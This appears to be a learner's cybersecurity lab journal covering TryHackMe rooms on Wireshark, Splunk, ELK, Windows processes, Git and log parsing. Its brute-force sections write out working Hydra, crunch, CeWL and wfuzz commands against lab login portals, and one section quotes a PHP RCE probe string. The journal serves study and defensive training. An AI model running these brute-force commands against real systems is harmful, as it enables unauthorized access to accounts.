INDEX - CTRL + F "XX - SUMMARY" to jump to summarized paragraph on specified topic. Use "Match Case" option :)
***************************************************************************************************************************
***ALPHA Index primarily used to document TryHackMe Learning***

AA         30 Nov 2023    Wireshark Traffic Analysis (WTA), ICMP
AB         30 Nov 2023    WTA, DNS
AC         30 Nov 2023    WTA, Cleartext Protocol Analysis, FTP
AD         30 Nov 2023    WTA, HTTP
AE         30 Nov 2023    WTA, HTTPS
AF         02 Dec 2023    THM, Day 2 Cyber Advent, Data Science + Cybersecurity, Python (Pandas and Matplotlib), Jupyter
AG         02 Dec 2023    Core Windows Processes, Task Manager
AH         03 Dec 2023    THM, Day 3 Cyber Advent, Brute-forcing with Hydra and Crunch
AI         03 Dec 2023    ELK (Elastic Search, Logstash, Kibana), and Beats
AJ         04 Dec 2023    Palo Alto Firewalls Class, Day 1, Lab 1
AK         04 Dec 2023    THM, Day 4 Cyber Advent, CeWL Brute-forcing and wfuzz for fuzzing
AL         05 Dec 2023    THM, Intro to Splunk and Incident Handling, Cyber Kill Chain Invesetigation
AM         06 Dec 2023    Palo ALto Day 3 & THM Investigating w/ Splunk Labs x2
AN         07 Dec 2023    Cloning Git repository to PC/Laptop via SSH
AO         08 Dec 2023    THM, Day 7 Cyber Advent, Manually parsing logs (Cut, Sort, Uniq, Grep, Base 64)
AP         14 Dec 2023    THM, Cyber Advent, Malware analysis, Firewall management, and Honeypot setup
AQ         15 Dec 2023    THM, Linux Forensics
AR         20 Dec 2023    THM, Phishing analysis tools, email analysis, Wireshark SMTP analysis. FInished SOC Level 1!
AS         20 Dec 2023    THM, Cyber Advent, Machine Learning to defeat captcha and brute forcing
AT         22 Dec 2023    THM, Cyber Advent, Server-Side Request Forgery, Splunk 2 Boss of the SOC
AU         23 Dec 2023    THM, Attacktive Directory, NMAP, enum4linux v.s. SMB/NetBIOS
AY         11 Jan 2024    AWS, Setting up an EC2 instance and connecting to it via SSH
AZ         18 Jan 2024    THM, Manual code review and Dynamic App Security Testing (DAST), finding webpage vulnerabilities
AAA        17 Feb 2024    THM, Logstash: Data Processing Unit
AAB        18 Feb 2024    THM, Wazuh Custom Alert Rules
AAC        23 Feb 2024    THM, Slingshot Elastic Stack Challenge
AAD        24 Feb 2024    THM, Sigma Rule Writing. Yuck    
AAE        28 Feb 2024    THM, Regex Search Practice
AAF        04 Mar 2024    THM, Threat Hunting, Catching Pass the Hash Attack
AAG        04 Mar 2024    THM, Hunt Me II Typo Squatters, Kibana
AAH        05 Mar 2024    THM, Threat Simulating with AtomicTest and MITRE ATT&CK Navigator
AAI        10 Mar 2024    THM, Caldera, Threat Simulating
AAJ        16 Mar 2024    THM, Linux Priv Escalation

******************************************************************************************************************************
***BRAVO Index primarily used to document SOC Analyst related labs***

BA        XX Feb 2024    SOC Automation Project featuring the full setup and integration of Wazuh, TheHive, and Sysmon

******************************************************************************************************************************
***CHARLIE Index primarily used for Splunk, Fortinet SIEM Labs***

CA        12 Feb 2024    Splunk, Search Processing Language Basics
CB        14 Feb 2024    Regex Search Practice
CC        XX Feb 2024    ELF Files
CD        XX Feb 2024    .Conf Files
CE        XX Feb 2024    Fixing event boundaries as it applies to log ingestion
CF          
CG         
CH        
CI        
CJ        


******************************************************************************************************************************
***DELTA Index used primarily to document virtaulization / Cloud projects***

DA        17 Feb 2024    Arch Linux Install Small Project

******************************************************************************************************************************
***ECHO Index used primarily to document the establishment of my LLC for designing, building, and protecting Personal Computers for Clients***

EA        22 Feb 2024    Establishing an expiremental web-page, hosted on AWS with a minimal spending goal, Background/Process
EB        02 Mar 2024    Building Code for Web Pages and Testing using Python3 http.server

------------------------------------------------------------------------------------------------------------------------------
***END OF INDEX***
------------------------------------------------------------------------------------------------------------------------------
***ALPHA***

AA - Loaded PCAP file, performed a quick walkthrough of the 961 Packets loaded. I learned today that ICMP packets are typically smaller in size, i.e, 64 bytes, 126 for the initial pings, but I noticed that a small number of ICMP packets were 1070 bytes long and a few spread between ~300 - 1000. 

AA - A seperate point of interest was pointed out by the video guide. The intial pings were being sent out on the second every second. It was hard for me to distinguish a pattern after awhile, but very obvious at first. Further research shows that this regular interval between pings is an abnormal behavior, either malicious or begnign, but worth noting eitherway.

AA - Next I will investigate the payloads to see if anything of interest is shown in plaintext. Packet #46 had the largest payload yet. Lots of mention of diffie-hellman key exchange, SHA hashing algorithms, SSH RSA, and much more. Not sure what this indicates... so some research is warranted

AA - ChatGPT help break down the situation. The text I found in the large ICMP packet is typical language for SSH negotiation parameters. The client and server are working out the agreement for key exchange. What is strange is that ICMP is not the typically used to transport SSH data. Very much so noteworthy.

AA - Before I continue, I wanted to review the OSI model because I think it is easy to understand when seeing it laid out in Wireshark. All of the layers except for Layer 1 (Physical), Layer 5 (Session), and Layer 6 (Presentation) are not shown in Wireshark.
Layer 2 - Data Link Layer: Represented as "Ethernet" or other link-layer protocol
Layer 3 - Network Layer: Represented by "Internet Protocol"
Layer 4 - Transport Layer: Displayed as TCP or UDP
Layer 7 - Application Layer: examples include HTTPS, DNS, and ICMP.

AA - Back on topic. After the initial key exchange that was performed, most of the payloads were unreadable. In packet 132 I found "test local" which was consistently in packets from that point on. Research says this is also abnormal, which I had no clue it was. ICMP packets are generally used for control messages and error reporting. So to see "testlocal" in the payload signifies that it has been injected.

AA - SUMMARY. I determined the following indicators of compromise: Large size/payload ICMP packets, SSH and key exchange over ICMP, and deliberate inclusion of a string "test local" in the ICMP payload.

AB - New task and initial walkthrough. I see a multitude of different protocols, but the main protocol is DNS. I remember DNS as the phone book of the internet. I filter by dns because that is the topic. The queries start of small <200 bytes. I begin to notice amongst binary text the term 'datexfil com'. Supposedly this is abnormal, but I wouldn't have known that.

AB - Video guide suggested to right click "Name" under the DNS "Queries" and add it as a column so I can quickly identify any abnormalities. Well that was easy. I sort by smallest because most of the names are obfuscated and unreadable. Once sorted I scroll to the top and wallah! DNS Cat and the data exfil sites were right there. I learned that DNS Cat is a solid IoC because DNS Cat is used by attackers to establish covert communication between compromised systems and C2 servers (Command and Control).

AB - On a random note, I learned what "Defanging" is today. probably for the second time. More importantly is the purpose of defanging something. By putting the brackets around the period ([.]) I reduce the likelihood of this url or code being used accidently because it would have to be defanged prior.

AB - SUMMARY. When it comes to finding abnormal DNS traffic it is not as useful to sort by length. I learned that larger lengths mean larger payloads which should've been more obvious. I still benefited from going through the payloads quickly to look for any clear text IoCs. That's how I stumbled upon it before doing it the easier way which was by adding the DNS query name column. I will likely use this feature moving forward. I also understand defanging better.

AC - FTP has more clear text in the comments than the previous two protocols (ICMP and DNS) which makes spotting abnormalities in the info column easier. Initially I see one bad login attempt and then someone used the admin user name but did not provide a password. Keeping an eye for that. Now I can see the actual data being passwed into the password column. I also see that is failing to authenticate.

AC - So this seems to be a brute-force attack using words the attacker may have gathered from recon and social engineering, because they aren't your typical run of the mill passwords.

AC - The video guide recommends going into the FTP data on a failed login packet and drag/dropping the "Response arg: Login incorrect." text into the display filter so that we only see these packets. This provides us with the information that there were 737 brute-force login attempts! Restarted my AttackBox machine and it was suprisingly not slow yet.

AC - Now I use the following filter: ftp contains "ftp", to find all packets that have a mention of the word "ftp" in clear text. This is an easy trick with FTP given the nature of the plain text used in this protocol. In my parenthesis I could use a different username or password if I was interested. At this point I am going to filter down to TCP conversations. This is cool because now I can see that the attacker successfully logged in and I can see all of his communication with the CLI. I know exactly what he is doing now.

AC - SUMMARY. FTP can be an easier protocol to follow what's going on. I learned the importance of using filters and that I don't necessarily need to memorize filter, but rather drag and drop them or right click to apply them. The next valuable thing I learned here was how to follow TCP conversations and why. This allowed me to easily follow the conversation between the attacker and his target which is all thanks to FTP being unsecure.

AD - I'm trying to determine the # of different user-agents, which is located under the HTTP content information. I wanted to try doing this myself using the new techniques I've learned so I applied new filter using a single user agent and then changed the filter to be not-equal to that. This is probably inefficient. Yeah totally is. Next I tried to create a column for User-Agent and sort/count it that way, but I was not able to get the correct answer.

AD - SUMMARY. Video guide shows that I wasn't far off. I need to pay better attention the user-agent text especially towards the end of the name. I was seeing Mozilla and automatically thought it was an ok user agent. What I failed to see was the Mozilla was mispelt as Mozlila and also mentions the Nmap Scripting Engine which should all be red flags. Ultimately, I just didn't know what was an normal/abnormal user agent name. Video guide recommends extracting this pcap and using tshark to comb through unique user-agents in the CLI. I also learned that an attacks starting phase will be associated with a POST command, or the other way around. Inside the post I found the attackers attempt to chmod and run a shell. It was encoded in base64 so I used cyberchef to decode this. I learned how to use tools->credentials in Wireshark to have the software gather all the potential login credentials found in the PCAP.

AE - Startted of realigning columns to their content. Checked the data link layer of the "Client Hello" packet to find frame number. Next I needed to decrypt the HTTPS traffic using a conveinently had cipher key. To implement this into Wireshark I went to Edit -> Preferences -> Protocols -> TLS -> and uploaded the key I had into the "(Pre)-Master-Secret log filename.

AE - I know that the cipher key worked because now my Wireshark packets have either a HTTP2 or TLSv1.3 protocol listed in the respective column. HTTP2 means that the application layer data will now be in plain text and TLSv1.3 will show me the transport layer data, but unfortunately not the application layer stuff. I located the authority header under the application layer data. Next I used the search feature and looked for the THM flag by searching "flag{" and done.

AE - SUMMARY. I learned how to decipher HTTPS traffic once a key has been acquired. I am not sure how to come into possession of the key, but I am sure that will come in time. I learned how to identify decrypted HTTPS data as HTTP2 and practiced applying OSI networking terms like application layer. All good things.

AF - I had a feeling I would enjoy this task. I was first more interested in "Data Analytics" than I was in Cybersecurity. This was mostly because I didn't fully grasp the world of Cyber. I still haven't, but I know a whole lot more. I am excited to learn how data science can be applied to Cybersecurity. I think I will have a better idea of what direction I want to take after this room.

AF - Some of this is a review. I took a Python class in October and I am in a Coursera Python class too. Using Jupyiter I practiced python3 strings, variables, and lists. I imported panda via: import panda as pd, importing it as a smaller amount of text makes it easier to recall this tool. This was able to create a numbered list as long as I gave it the items and the column names, rows were automatically numbered. Next we used Matplotlib. To import we used: import matplotlib.pyplot as plt , again using a shorter name to call the tool later. Supposedly matplotlib acts wierd in Juypiter so I used the following command to keep it in line: %matplotlib inline . Next plt.plot() creates a line graph/plot.

AF - Now for the capstone challenge where I use everything I just learned about to include Python3, Panda, and MatPlotLib. First we import our libraries of course. Next I dentify the documents that I will be referencing and open up a fresh slate. First to aggregate the data I used:
    df = pd.read_csv('network_traffic.csv')
    df.head(5)
    #df stands for data frame and I use it as a variable set to use panda to read a csv file and specify the name of the file
    #df.head(5) calls my df variable to read the file specified and print the first 5 rows.
    next I use df.count()
    #again calling my df variable and using the count method to coun the number of rows for each column.
    next command: df.groupby(['Source']).size().sort_values(ascending=False)
    #this one is much more complicated. Calling the df variable and several methods. First we are grouping by the column called source which is the IP address column. Then we use the size method and sort values method to create a list showing us which IP addresses were listed the most times in the source document. We do this one more using the protocol column.

AF - SUMMARY. The video guide for this task spoke alot to the importance of using python and data science tools to become a master cyber analyst. This lesson reinforced that idea with me and I plan to spend more time. I learned about some python tools that can be imported for making data analytics and visualization easier. I am still not comfortable with using these tools without a guide but that will come with time. The tools I used today were Panda and MatPlotLib.

AG - I used stuffy24's video guide to pace me through the lesson. He believes this is an important lesson because being familiar with the baseline Windows processees will help me identify and abnormal processes a.k.a Indicator of Compromise. First I learned how to view Process ID #s in task manager along with other columns by right clicking the columns. I had used PIDs during the Metasploit rooms, specifically when using Meterpreter to take over processes/services.

AG - I selected all columns to be visible via right clicking column headers and I wanted to pay special attention to 'Type', 'Publisher', and 'Command Line' because these are the ones that are not defaulted on and therefore I am the least familiar with. I did this on my own computer instead of the VM because I wanted exposure to what was going on with my own machine. I noticed that some processes belonged to Microsoft as two separate entities to include Microsoft Windows and Microsoft Corporation. Adobe had some processes going which made me curious because I have no clue why Adobe is running. AMD processes made since with the CPU and GPU software running in the background. Discord had a surprising number of background processes as did Oculus which I don't use enough to allow that to consume resources. Moving on I noticed when it came to PID that the numbers seem to be assigned chronologically at boot and so on. PID 4 is always 'System'. Process types considered 'Apps' seem to be only things that I can actively see on my screen i.e., Chrome and Task Manager. Windows processes seem to be things that are necessary to allow the computer and operating system to do the things that they were designed to do. Seeing the command line language was interesting. One thing I draw from this is we can see if the process is being run from a legit place or not. This also reinforces how much more difficult Windows command line is compared to Linux, at least in my opinion. I think that I will definitely use Linux as my main OS when I build my next computer in many years. Distracted agian. Last I looked at the consumed resources data and noticed that Chrome consumes a lot of memory and so does the combination of many of my background tasks. I think that I will need to add 2 more 16gb RAM sticks in the future. Chrome is also CPU intensive and power intensive.

AG - The video guide mentions to pay attention to the Command Line info, for example a printer's exe file shouldn't have a command line prompt that calls to communicate with an server elsewhere. Stuff like that. We went over the Process Hacker tool which is a better task manager, but may not be available on a corporate end user machine. Same thing for Process Explorer. The video guide goes on to explain the importance of not being limited by tools and to have the skills to perform functions without special tools. Out of curiousity I asked GPT how to find parent processes without fancy tools.

AG - I can view parent processes using CMD and the following commands; wmic process where "Name='System'" get Caption,ParentProcessId,ProcessId. Another method would be to replace the Name=System part with ProcessID=7376 or some other number.

AG - SUMMARY. Some processes are only started by other processes. System always has a PID of 4. System is always the parent of smss.exe and anything else should be concerning. The process smss.exe will only show up in task manager when it is starting up another process and then it will disappear which is what is known as a non-existant process (when checking the parent). There should always be 2 instances of csrss.exe running known as session 0 and session 1. These processes should always have a non-existent parent. winlogon.exe is the ALT+CTRL+DELETE key combo used prior to entering the user and pass. Wininit.exe is started by smss.exe instance which disappears. Wininit.exe -> services.exe -> svchost.exe. Userinit.exe spawns explorer.exe and causes explorer.exe to have a non-existent parent.

AH - Ok this was awesome. I find brute-forcing to be very interesting and using Crunch/Hydra is new to me. First, I determined the maximum number of characters that could be used. In this case it was a pin pad so the minimum and maximum amount of characters were the same, 3. I had 0-9 and A-F as options so that gives us 16 possible characters over a 3 character pin. Crunch generated 4096 possiblities. The crunch command as follows: crunch 3 3 0123456789ABCDEF -o 3digits.txt This sets the min and max characters to 3, specifies the possibile characters and gives an output file that will be used later.

AH - Hydra time. Here is the command: hydra -l '' -P 3digits.txt -f -v 10.10.59.67 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000 . To break this dowm, -l '' tells hydra to login with no username because nothing was specified between the quotes. -P 3digits.txt tells hydra to use my crunch created password list. -f and -v tells hydra to stop when login is successfull and provide a verbose output should I need to troubleshoot. We include the IP address of the login portal, we specift that we are using HTTP post method to submit our password to the server, and the next part is a little tricky. "/login.php:pin=^PASS^:Access denied" is actually three sections separated by colons. When I view the access portal source code I can see that /login.php is the page where the password is submitted and pin=^PASS^ tells hydra to submit the passwords from my list at this point in the web transaction. We also include the text that would be displayed if the password failed, which is "Access denied". This works and I have entry.

AH - SUMMARY. Very fun box. I used crunch to create a password list that doesn't waste time with any password that are not possibilities. This required a small amount of enumeration like going to the website and seeing what the pin pad would. I used that password list that crunch made with Hydra and this Brute-forced the website in a very short ammount of time.

AI - Finally some good stuff after the boring Windows-based rooms that were putting me to sleep. Excited to learn about ELK because I've heard it mentioned several times in comparison to Splunk. I learned the process of which the ELK components work together to accomplish the end goal. Beats is the data collection agent, Logstash does the data input/filter/process/output, Elastic search indexes the data, and finally Kibana is the analysis and Visualization tool to gain the insight into what the data means and allows us to search the data that has been indexed.

AI - SUMMARY. I used Kibana to practice filtering my query to gain specific results. I found a way I think is easiest to filter. Say I want to find "John" and the only name I see is "Will". Well I can filter by Will and then edit the filter to say John. Easy day. I learned the Kibana Query Language. Honestly seemed very forgiving. Next was to create some visualizations. Here I was able to create visuals that would probably be appealing for presenting to others, but I think I'd rather have the data. Neat feature though.

AJ - Revisiting OSI again. A network switch is just a way to complete the circuit. In one connection and out another. Example is telephone operators connecting phone lines through the physical application (way back in the day). Data link layer is switching, uses MAC addresses. Network layer uses IP addresses to connect numerous networks, does routing. Transport layer is mainly made up of Transmission Control Protocol and User Datagram Protocol, uses ports. Being a Next Gen Firewall means you can do Layer 7 analysis which is also known as a DPI or Deep Packet Inspection to see the actual data that is being passed over a network.

AJ - Instructed to look into Kubernetes which is a way to run work loads in their own environments, knows as containers. New topic, discussed Zero Trust which is never trust; always verify. Inspect perimeter and internal traffic. Inspect north-south traffic to the internet as well as east-west traffic within the internal network, which is traffic between users and applications. I learned that firewalls are actuall hardware components, I always imagined it as a virtual component. That being said, a physical firewall can be partioned into several logical firewalls with its own set of policies.

AJ - Statefull firewalls package packets into sessions to inspect. The sessions are specific to conversations like a web browsing session. This gives the firewall more context as to what the session is related to. New sessions per second is a metric of how many sessions a firewall can handle at one time. Just loaded the first lab which is deploying a firewall. Started by applying a baseline configuration to the firewall. Unrelated reminder to myself (because it showed up on the firewall webpage), FQDN stands for fully qualified domain name. includes:
    Protocol: https://
    Subdomain: WWW.
    Domain Name: tryhackme
    Top Level Domain: .com
    Root Domain: tryhackme.com
    To look up a DNS use nslookup https://www.springschapel.org

AJ - MGT is the label for a management port on a firewall. Console is a port plug for using command line interface. This is called Remina in lab. I set the permitted IP address to manage the firewall is 192.168.0.0/16. This allows all IP addresses that start with 192.168 and subnet 255.255 to manage the firewall. Misconfiguration here can lose network connectivity to the firewall and would require special intervention.

AJ - SUMMARY. Great lesson. Reviewed network basics and gained a new perspective on the OSI model. Discussed the physical layer in more detail. Discussed what make a NGFW a NGFW and how Palo Alto (PA) is special here. Practiced setting up and updating the PA firewall.

AK - The goal is to gain access to a portal (http://10.10.114.184/login.php), using CeWL. This is the initial command we will be using: cewl -d 2 -m 5 -w passwords.txt http://10.10.114.184 --with-numbers . To break this down, -d is the depth which defaults at 2. The video guide explains this as the number of clicks that will need to be made on the page, hoping to clarify this more. Next is the -m flag which sets the mimimum word length. -w writes the output to the specified file and of course we include the target. --with-numbers tells cewl that its okay to include numbers. This generated 253 passwords which I determined using the wc -l passwords.txt command.

AK - I learned that CeWL creates lists based on information found on the website specified. Probably not a good idea to use credentials that are related to the web content. Anyway, I did the same thing to create a 37 username text file. I inspected the file with nano and realized that alot of the items were not probable usernames so I went ahead and edited it down to 21 names. With both my usernames and passwords lists created it was time to brute-force. However this was different than I have ever done before because now we are using wfuzz which is a fuzzing tool. At this point I should test the website using burp to see if the login page I was given is the definite location where credentials are passed via POST requests. It is, good to go.

AK - For the fuzzing uising wfuzz this was the command: wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.114.184/login.php -d "username=FUZZ&password=FUZ2Z" . Break this down; -c tells wfuzz to output with colors, -z file,usernames.txt and passwords.txt sets it to scan mode meaning connection errors will be ignored and uses our generated lists. --hs "Please enter the correct credentials" is the error message when login fails so i use this to hide responses with this. -u specifies url and -d provides the POST data format where FUZZ will be replaced by the items in our wordlists. FUZ2Z is not a typo, it specifies the order.

AK - SUMMARY. I used CeWL almost as a OSINT harvesting tool for generating wordlist. Then used wfuzz to insert wordlist items into the POST command and brute-force more or less a web portal. I learned how important editing the wordlists are. I thought I did ok, but it took 5566 attempts compared to the video guide who sent 508 requests. I think both would stand-out to blue-team but mine was far worse. This stresses the importance of carefully selecting usernames and passwords. I learned that this was possible because there were restrictions imposed on the login portal like number of attempts etc. I originally thought it was related to the portal being a .php but that was not the case. I learned alternatives to wfuzz are ffuf which might have a better syntax in my opinion. There is also Hydra which we used yesterday. Hydra looks as difficult as wfuzz. Burpsuite is a final option provided by the video guide. Problem is burp community edition is too slow for intruder, there is a free extension called turbo intruder which solves this. Made by the same people who make burp LOL.

AL - Started the morning going over Splunk Enterprise on THM. Loaded a .json file for some VPN logs and used filters to find specific data. Initial thoughts are I found Kibana slightly easier in terms of overall interface, but I know with practice this will become easier. Patrick talked about using API and python to automate things with the firewall. To get there we used http://192.168.1.254/api. Had several conversation about authentication protocols that are options in the firewall such as LDAP, TACACS+, Kerberos, RADIUS, and more. Struggling to focus on the firewall class, mostly my fault, sort of the instructor going off on tangents that I don't want to follow. Back to the THM Splunk Incident Handling Room

AL - I take the given web server to plug into the search query and also filter by http traffic with stream:http. 20k results. I check the source IPs communicating to my server and I get two main IPs (40.80* and 23.22*) with the vast majority of traffic from the former. I filter down to the loud IP and use suricata to see what alerts generated. Of interest there was a CVE-2014-6271. Research via MITRE shows this CVE is known as "Shellshock" that was a bash vulnerability. Spoiler-alert, this lab deals with a brut-force attack against a web-server access-portal so I don't think it is related to the CVE, but worth investigating either way. I continued to add filters that I thought would help me get to the bottom of what was going. Alright, lets be real...tryhackme told me what to do, but I understand what is going on, I think? ALl of the traffic we investigated up to this point were all indicators of the attacker going through the recon phase of the cyber kill chain.

AL - I filtered down to POST methods over HTTP and started looking into the common requests and that's where I found: <?php echo(md5(acunetix-php-cgi-rce)); ?>. The lab doesn't talk about this but I thought the combination of php code and the echoing of a md5 hash (of an unknown item) was suspicious. ChatGPT said this was probably malicious, but not entirely trusting of this. Moving on, I look at the URI results and see a uri="/joomla/administrator/index.php" which I look into by going to that webpage which happens to be the logon portal. I create a query to generate statistics which well help me analyze the data, which leads to a discovery of a brute-force attack from the unsuspecting 23.22* IP address. We regex the data to make it even easier to read usernames and passwords (which are sadly passed over in cleartext btw) and I see the attacker is attempting to take the admin account. I learned that Regex stands for regular expressions. I used this to pull just the password values. rex field=form_data "passwd=(?<creds>\w+)" does this and now I have a column with just usernames. Next we investigate the user agents and discover that a python script was being used for the brute forcing. We find that the final password attempted was 'batman' before the brute-force stopped and then the 40.80* IP with the Mozilla user-agent logs in with batman. So there is 1 attacker and two ip addresses (one associated with the password cracker and one associated with the device the attacker uses to log in). The attacker has successfully completed the exploitation phase.

AL - Now to figure out what the attacker did once they gained access. Updating the filter, we look for any .exe files that were used and include the "part_filename{} field to find a filed called 3791.exe no bueno. Looking at the payload I found some plaintext that says, "This program cannot be run in DOS mode." The http method was also POST which tells us this .exe was uploaded to the server. I start breaking away from the thm guide at this point. I notice the .exe was uploaded as an image from an Image Loaded packet. I also see the MD5 hash in this packet so I'll lookup if it is a known malicious file on VirusTotal which provided me with an astounding yes this is in-fact a malicious file (Malware Trojan). Some of the MITRE ATT&CK TTPs used are Privilege Escalation, Defensive Evasion, Credential Access, Discovery, Collection, and C2. It is capable of data-manipulation, host-interaction, and executable. One of the most interesting things that I found is the decoded text under the behavior tabs (VirusTotal) says {"Type": "Metasploit Connect", "IP": "23.22.63.114", "Port": 3791} which is interesting because in my scenario that same IP was the browser that logged into the admin page and the .exe was name 3791 which is the port here. Interesting stuff!

AL - Some more snooping I find that cmd.exe was ran in the command line and the parent process was the malware .exe. I verified this was cmd.exe with the file hash. It was at this point I learned that Splunk Events are not the same thing as packets. Splunk Events can be packets should that be the source but they can come from Windows_Event_signatures. One thing that is really stumping me is how the user account associated with executing the malware is the NT AUTHORITY\IUSR account. Back to the THM guide. I learned that Event ID: 1 is associated with creation a new process and there was an event for when the malware was executed. We have proof that the threat actor has now completed the installation part of the cyber kill chain. Next we try to figure out how what the attacker did with the backdoor they installed. I only know its a back door because THM said so, nothing on VirusTotal pointed to that. The guide shows me that when I filter down to suricata traffic that has the web server as the destination that there were no external communications. In other words all of the events generated by suricata show only communications internal to the network when we were mostly concerned with external comms to the internal network. When I reverse the filter to show the web server as the source IP, we now see the web server communicating with the threat actors which is peculiar for sure. I continued narrowing down the filter and eventually found a jpeg file that I haven't seen so far in this THM room and the file name is suspect. I found this via Url filtering. We found the server from which the jpeg was downloaded. I learned you can pause a query if it is generating alot of traffic and messing up operations. During the Command and Control phase investigation the main thing I learned is that it may be necessary to keep certain parameters in the filter the same while changing a single one, for example changing the source type back to htttp to see web traffic.

AL - SUMMARY. This was a beast. Today I learned to use the Splunk Enterprise search / query / filter features to find suspicious activity. What filters I found most  helpful are: source / sourcetype because this shows you where the log came from, whether it be HTTP traffic or the IDS triggered on some traffic. The rest of the filters will change drastically depending on what you modify here so it's important to be familiar with the possible types so that you can evaluate the contents and understand what is happening. For example, knowing what the POST method means with HTTP / HTTPS traffic or knowing that suricata is an IDS so I might want to filter down the event_type. There is endless combinations and in the end I will get better by experimenting and learning. I learned why documenting the incident and all of your finding is important and how to do that a little better. I studied the cyber kill chain more and tried to apply it to what was happening. Great lab.

AM - Learned that RFCs or request for comments are the "rules for the internet". RFC 1918 February 1996 established Private IP Address Space. Anything that starts with 10.10, 172.16**, 192.168** are reserved for private networks. Because of concerns of running out of addresses we began using subnets. It was cool to see the source documentation for how this was established in my birth year.

AM - Today using Splunk I had much less direction. I needed to set the index on my own. I have an idea. I'm going to take notes on here and roleplay as an analyst or atleast how I imagine one to be. All of the events are from an event_log but no details beyond that. The layout of the alerts suggests it's from a PCAP or Sysmon. It doesn't look like the alerts from yesterday. There are 2 NT AUTHORITY users which make up ~75% of the traffic. The other 2 are Cybertees users, whatever that is. I think it is intersting 98% of traffic is from account name System and then a small amount of traffic from James. The most ran application is svchost.exe which may not be strange because it acts as a common parent process for other services, but 61% seems excessive. I noticed in the category for alert there was a "File Created" filter with not a lot of traffic, but I was curious. Once I filtered this on I checked host name to see who was doing this and James.Browne accounted for 92% of the occurences. I also noticed that the top 3 images associated with these were svchost.exe, BackgroundTransferHost.exe, and backgroundTaskHost.exe. I asked GPT about why the b in background wasn't capitol in the third .exe and learned that Windows file systems are case-insensitive whcih I think is stupid because that would be an easy IoC. Oh well. I went through alert categories and a few of them stood out to me to include Handle Manipulation and Process Accessed. My task says to find out what account the threat actor created. I struggled with this one, but ChatGPT informed me the EventID for a new account is 4720 which led to the answer. I didn't know prior that eventID #s are set in stone by Windows. At this point I was pretty stumped so I pulled up a guide. The next thing I needed to was to filter EventID 1 and view the command line field which gave me the executed remote code. ID code 3 was used to show us how when new network connections are logged which would have shown me if the backdoor was used. Event ID 4103 is logged for whenever powershell is enabled. Finished Lab 1.

AM - Limited to only Event ID 4688 which is used to identify the start of a new process creation. I struggled very hard with this room. I learned through some guides some useful ways to use piping in Splunk to create statistics and table such as | stats count by UserName and | table UserName | dedup UserName. I used multiple guides and they all said I needed to know that schtasks.exe is a normal Windows executable for running scheduled tasks. The question was Which user from the HR department was observed to be running scheduled tasks? This drove me nuts because no way do all these people know that, cheaters. I learned a new term today LOLBIN which stands for Living off the land binaries which are binaries that are not inherently malicious and they are local to the OS, but attackers use them to bypass detection.

AM - SUMMARY. Today was tough. What I learned: Learned the reserved private IP addresses. I tried to investigate on my own, but ultimately today came down to knowning about Event IDs which have more meaning than I suspected. FIltering and researching these was all I needed in the first room. The second room was nearly opposite because we were limited to one ID. I got more practice with using the statistics and visualization tools within Splunk. The second room required more knowledge about LOLBINs and now I have a good resource for that. I had to do a lot of filtering by ProcessName and I wish I knew a better way. Good challenge.

AN - I made a new repository for the Springs Chapel project on GitHub.com. Now I want to clone the repository to both my PC and laptop so I can edit it on the road and at home and the pastor will have the ability to edit it without version control issues. I have the Springs Chapel (SC) folder on my desktop so I modifed my directory location in powershell (PS) to be there. Now to use git clone and the command generated on the web-based repository. My computer warns me that authenticity can't be established because this is the first time connecting to it. I am given the SHA256 hash of a public key which I learned that the key is generated using the ED25519 asymmetric cryptography a.k.a Edwards-curve Digital Signature Algorithm. 25519 refers to the prime number 2^255 - 19 which defines the specific elliptic curve. I'll check the hash against the website's fingerprint registry. Using powershell is a more difficult method of comparing hashes then I expected, so I am going to do it in Python instead. I create two variables for each key. Then I am sure to remove spaces or tabs a.k.a whitespace characters. They matched. I stored the GitHub (GH) fingerprint but my public key is not associated with my GH account so now I generated a new key and associated the email associated with my GH account. ssh-keygen -t ed25519 -C tannerlayton01@gmail.com. It created a really interesting looking randomart image for my key's fingerprint. I then went into my account settings and added the SSH key. Then back to PS and I used ssh -T git@github.com to check that my update worked and it did! I got an error message just because the repo was empty on the website but now I will create a document via PS. echo "# SpringsChapel" >> README.md
git add README.md
git commit -m "Initial commit"
git push origin main
Now I will open the current folder in VS Code (VSC) to edit the readme document to test the pushing of the document to the main repository. Now to push the document back to the online repository I use the following commands: 
git add README.md
git commit -m "a second trial, nothing to see here"
git push origin main
Now I am doing the same process on my laptop.

AN - SUMMARY. This was all about learning how to use GitHub and Git on the CLI of Windows via powershell. The purpose is to have a quick way to upload a document via command line to a repository on the internet using very secure means (SSH) which use asymmetric encryption. First I generated my own public and private keys specifically for this purpose with a key gen command. Then I took my public key and added it to my GitHub account which allowed me to authenticate myself later when interacting with Git. This will take alot of practice to remember the syntax.

AO - I have a log file saved in working directory. Using cat provides me with a ton of data that is hard to read although I can tell the format of the log which goes something like; date/time, source IP, domain and port, HTTP method, and so on. I can cut through the logs to display one column at a time using; cut -d ' ' -f1 logfile.log. the -d flag is the delimeter which in this case I set to space with ' '. Then I used the -f flag to set the position which means the first time my set delimeter is found in a line will be the end point for each line extraction. So I would only see the date/time for each row. -f2 would give me just the source IPs. I can pick out multiple columns using -f1,3,6 for example.

AO - For my next cut I was trying to pull ther user-agent which begins and ends in quotations. If I set the delimeter to '"' and -f to 1 then I only see everything before the first " which is not what I want to I set it to 2 to see the information between quotes which is the user-agent. Next we move into pipes. Reminder the pipe takes the output of the first command and uses it as the input to the second command. I used grep to find a phrase in the logfile and then piped it to head -n 5 to only show the first 5 occurences. I can also pipe one cut into another if I need to split it even further.
Next we incorporate the sort and uniq commands. I learned that data in text file will need to be sorted because the sort command is only capable of comparing adjacent lines. Piping is pretty cool, I learned there is not really a limit to how  many times you can do it in a single command. Example: cut -d ' ' -f3 access.log | cut -d ':' -f1 | head -n 5 | sort | uniq. I was only adding head -n 5 in there because I wanted to reduce the amount of data returned.
Lets disect the following command:

cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort | uniq -c | sort -n | tail -n 10

1. we take the file named access.log and we cut out a portion of the text belonging to each line on the third occurence of the delimeter ' '
2. that feeds the next delimeter of ':' which is set to the first occurence and cuts the port numbers off the first output
3. we take those results and sort them alphabetically so that duplicate items are grouped together which is a necesseity for the next step
4. Now we eliminate duplicates but the -c flag keeps track of the total number of occurences
5. we sort these numerically instead of alphabetically so we can see least to most
6. We reduce the results to the top 10 highest occurences. Pretty sweet right?

